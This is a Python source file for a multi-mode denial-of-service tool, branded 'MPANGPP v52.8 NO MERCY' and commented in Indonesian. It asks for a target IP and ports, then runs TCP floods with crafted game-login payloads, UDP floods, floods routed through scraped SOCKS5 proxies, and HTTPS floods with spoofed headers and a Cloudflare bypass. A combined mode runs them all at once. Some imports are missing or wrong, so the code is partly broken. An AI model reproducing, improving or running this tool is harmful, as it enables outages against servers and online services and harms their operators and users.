import socket, struct, random, threading, time, sys, asyncio, multiprocessing, platform
import ProxyConnector

try:
    import cloudscraper
except:
    print("❗ Jalankan: pip install cloudscraper uvloop aiohttp aiohttp-socks httpx")
    exit()

# Boosted UVLoop
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# Versi Booster
UID_PREFIX = "MPANGPPv52.8_NOMERCY"
symbols = ['💀','⚛️','🧨','🌀','🌌','🛐','👑','☠️','👻','🔱','🌪️','🔥','🧠','💣']

# 🔥 BOOSTED CONFIG
TCP_CLONES = 1_500_000
UDP_THREADS = 800_000
BURST_SIZE = 2_000_000
BURST_DELAY = 0.000001
SMART_CONCURRENCY = 250_000
SYNC_TEXT = "💀 MPANGPP v52.8 💣 TARGET LOCKED 🔥"

# Proxy Pool
proxy_list = multiprocessing.Manager().list()
current_proxy_index = multiprocessing.Value('i', 0)
total_sent = multiprocessing.Value('i', 0)

# Ambil proxy SOCKS5 dari banyak sumber
async def fetch_proxies():
    urls = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://proxyspace.pro/socks5.txt",
        "https://www.proxyscan.io/download?type=socks5",
        "https://openproxy.space/list/socks5",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5.txt",
        "https://multiproxy.org/txt_all/proxy.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt"
    ]
    proxies = set()
    async with aiohttp.ClientSession() as session:
        for url in urls:
            try:
                async with session.get(url, timeout=10) as r:
                    for line in (await r.text()).splitlines():
                        if ":" in line:
                            host, port = line.strip().split(":")
                            if port.isdigit():
                                proxies.add(f"{host}:{port}")
            except:
                continue
    proxy_list[:] = list(proxies)
    print(f"✅ Loaded {len(proxy_list)} proxies from {len(urls)} sources.")

# UID Generator
def generate_uid():
    glitch = ''.join(chr(random.randint(0xDC00, 0xDFFF)) for _ in range(16))
    core = ''.join(random.choices(symbols * 10, k=40))
    return UID_PREFIX + core + glitch

# Payload dasar
def generate_payload(uid):
    junk = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=90000))
    return f"tankIDName|{uid}\ntankIDPass|123\nrequestedName|{junk}\ntext|/warp 99\n\n".encode()

# Variant broadcast / opcode custom
def generate_variant(cmd):
    scrambled = cmd.replace("broadcast", "🧨broadcast💣")
    head = struct.pack("<BIIIIIIIIIIIf", 0x04, 8, -1,0,0,0,0,0,0,0,0,0.0)
    body = b"\x1E" + struct.pack("<i", 2) + struct.pack("<i", -1) + struct.pack("<i", 2)
    body += struct.pack("<H", len(scrambled)) + scrambled.encode("utf-8", "ignore")
    return b"\x03" + struct.pack("<i", len(head + body)) + head + body
# Ambil proxy secara berputar
def get_next_proxy():
    with current_proxy_index.get_lock():
        if not proxy_list:
            return None
        proxy = proxy_list[current_proxy_index.value % len(proxy_list)]
        current_proxy_index.value += 1
        return proxy

# Port parser (17091-17120 atau 17091,17192)
def parse_ports(port_input):
    ports = set()
    for part in port_input.split(","):
        if "-" in part:
            a, b = map(int, part.split("-"))
            ports.update(range(a, b + 1))
        else:
            ports.add(int(part))
    return sorted(ports)

# TCP Flood basic
async def tcp_attack(ip, port):
    uid = generate_uid()
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
        writer.write(generate_payload(uid)); await writer.drain()
        for _ in range(75):
            writer.write(generate_variant(SYNC_TEXT)); await writer.drain()
            await asyncio.sleep(0.001)
        with total_sent.get_lock():
            total_sent.value += 1
        await asyncio.sleep(60)
    except:
        pass
    asyncio.create_task(tcp_attack(ip, port))  # auto respawn terus

# UDP Spam bom
def udp_flood(ip, ports):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b"\xFA\xFB\xFC\xFD" * 30000
    while True:
        try:
            port = random.choice(ports + [random.randint(20000, 65535)])
            sock.sendto(data, (ip, port))
        except:
            continue

# Jalankan banyak thread UDP
def run_udp_loop(ip, ports):
    for _ in range(UDP_THREADS):
        threading.Thread(target=udp_flood, args=(ip, ports), daemon=True).start()

# Smart flood via proxy SOCKS5
async def smart_flood(ip, port, proxy=None):
    try:
        connector = None
        if proxy:
            host, p = proxy.split(":")
            connector = ProxyConnector.from_url(f'socks5://{host}:{p}')
        async with aiohttp.ClientSession(connector=connector) as session:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=5)
            uid = generate_uid()
            writer.write(generate_payload(uid))
            await writer.drain()
            for _ in range(10):
                writer.write(generate_variant(SYNC_TEXT))
                await writer.drain()
                await asyncio.sleep(random.uniform(0.005, 0.01))
            with total_sent.get_lock():
                total_sent.value += 1
            writer.close()
    except:
        pass

# Hybrid attack via proxy pool
async def hybrid_proxy_attack(ip, port):
    tasks = []
    for _ in range(SMART_CONCURRENCY):
        proxy = get_next_proxy()
        tasks.append(asyncio.create_task(smart_flood(ip, port, proxy)))
    await asyncio.gather(*tasks)
# Spoof Header for HTTP/HTTPS flood
def spoof_headers():
    return {
        "User-Agent": f"MPANGPPv52.8_{random.randint(1000,9999)}",
        "X-Forwarded-For": ".".join(str(random.randint(1,254)) for _ in range(4)),
        "Referer": "https://google.com"
    }

# HTTP/HTTPS Flood via httpx
def flood_httpx(ip, port, duration):
    url = f"https://{ip}:{port}"
    end = time.time() + duration
    while time.time() < end:
        try:
            with httpx.Client(http2=True, verify=False, timeout=5.0) as client:
                r = client.get(url, headers=spoof_headers())
                if r.status_code < 500:
                    with total_sent.get_lock():
                        total_sent.value += 1
        except:
            continue

# CLOUDFLARE BYPASS via cloudscraper
def flood_cf(ip, port, duration):
    url = f"https://{ip}:{port}"
    end = time.time() + duration
    scraper = cloudscraper.create_scraper()
    while time.time() < end:
        try:
            r = scraper.get(url, headers=spoof_headers(), timeout=10)
            if r.status_code < 500:
                with total_sent.get_lock():
                    total_sent.value += 1
        except:
            continue

# MODE 7 – HYBRID OVERKILL SEMUA MODE
def hybrid_overkill(ip, ports, duration):
    print("💥 MODE 7 AKTIF: HYBRID OVERKILL NO MERCY ⚔️")
    p1 = multiprocessing.Process(target=lambda: asyncio.run(hybrid_proxy_attack(ip, ports[0])))
    p2 = multiprocessing.Process(target=lambda: run_udp_loop(ip, ports))
    p3 = multiprocessing.Process(target=lambda: flood_httpx(ip, ports[0], duration))
    p4 = multiprocessing.Process(target=lambda: flood_cf(ip, ports[0], duration))
    p5 = multiprocessing.Process(target=lambda: asyncio.run(tcp_loop(ip, ports)))
    for p in [p1, p2, p3, p4, p5]:
        p.start()
    for p in [p1, p2, p3, p4, p5]:
        p.join()

# TCP Loop Continuous
async def tcp_loop(ip, ports):
    while True:
        await asyncio.gather(*[tcp_attack(ip, random.choice(ports)) for _ in range(TCP_CLONES)])

# MENU UTAMA
def main():
    ip = input("🎯 Target IP: ").strip()
    ports = parse_ports(input("📶 Ports (e.g. 17091–17200): ").strip())
    duration = int(input("⏱️ Durasi (detik): ").strip())

    print(f"""
🔥 MPANGPP v52.8 BOOSTED NO MERCY
🎯 IP Target      : {ip}
📶 Ports          : {ports}
⏱️ Durasi        : {duration}s
💀 TCP Clones     : {TCP_CLONES}
💣 UDP Threads    : {UDP_THREADS}
⚔️ Burst Size     : {BURST_SIZE} / Delay {BURST_DELAY}
🧠 Smart Proxy    : {SMART_CONCURRENCY}
☁️ CLOUDFLARE     : ✅ Bypass Aktif
""")

    print("""
📌 Mode:
[1] LOOP TCP CLONES
[2] UDP FLOOD
[3] PROXY SPAMMER
[4] HTTPS FLOOD (httpx)
[5] CLOUDFLARE BYPASS
[6] COMBO SMART PROXY
[7] 💣 MODE DEWA – HYBRID OVERKILL
""")

    choice = input("⚔️ Pilih Mode: ").strip()
    if choice == "1":
        asyncio.run(tcp_loop(ip, ports))
    elif choice == "2":
        run_udp_loop(ip, ports)
        time.sleep(99999)
    elif choice == "3":
        asyncio.run(hybrid_proxy_attack(ip, ports[0]))
    elif choice == "4":
        for _ in range(100):
            threading.Thread(target=flood_httpx, args=(ip, ports[0], duration)).start()
        time.sleep(duration)
    elif choice == "5":
        for _ in range(100):
            threading.Thread(target=flood_cf, args=(ip, ports[0], duration)).start()
        time.sleep(duration)
    elif choice == "6":
        asyncio.run(hybrid_proxy_attack(ip, ports[0]))
    elif choice == "7":
        hybrid_overkill(ip, ports, duration)
    else:
        print("❌ Mode tidak valid.")

if __name__ == "__main__":
    try:
        asyncio.run(fetch_proxies())
        main()
    except KeyboardInterrupt:
        print("🛑 Manual stop.")
